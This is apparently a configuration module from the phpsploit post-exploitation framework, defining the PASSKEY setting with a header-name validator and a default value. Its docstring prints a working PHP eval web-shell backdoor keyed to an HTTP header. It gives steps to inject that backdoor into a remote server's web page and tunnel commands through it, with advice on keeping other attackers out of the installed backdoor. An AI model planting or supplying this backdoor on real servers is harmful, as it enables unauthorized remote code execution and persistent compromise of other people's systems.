"""
HTTP Header to use as main phpsploit payload stager for RCE.

PASSKEY is used by BACKDOOR setting, and phpsploit's http
tunnel mechanisms as the main payload stager & dispatcher.

While exploiting a remote TARGET with phpsploit, make sure
PASSKEY have the same value as the one it had when backdoor
had been generated.

* AUTHENTICATION FEATURE:
It is recommended that you permanently change PASSKEY value
to a custom value for authentication purposes.
Indeed, having a custom PASSKEY value ensures that other
phpsploit users will not be able to connect to your installed
backdoor without the knowledge of it's value.

* EXAMPLE: Use a custom PASSKEY to prevent unauthorized access
> set PASSKEY Custom123
> exploit
# [*] Current backdoor is: <?php @eval($_SERVER['HTTP_CUSTOM123']); ?>
# To run a remote tunnel, the backdoor shown above must be
# manually injected in a remote server executable web page.
# Then, use `set TARGET <BACKDOORED_URL>` and run `exploit`.
"""
import re

import linebuf


linebuf_type = linebuf.MultiLineBuffer


def validator(value):
    value = str(value)
    reserved_headers = ['host', 'accept-encoding', 'connection',
                        'user-agent', 'content-type', 'content-length']
    if not value:
        raise ValueError("can't be an empty string")
    if not re.match("^[a-zA-Z0-9_]+$", value):
        raise ValueError("only chars from set «a-Z0-9_» are allowed")
    if re.match('^zz[a-z]{2}$', value.lower()) or \
       value.lower().replace('_', '-') in reserved_headers:
        raise ValueError("reserved header name: «{}»".format(value))
    return value


def default_value():
    raw_value = "phpSpl01t"
    return raw_value
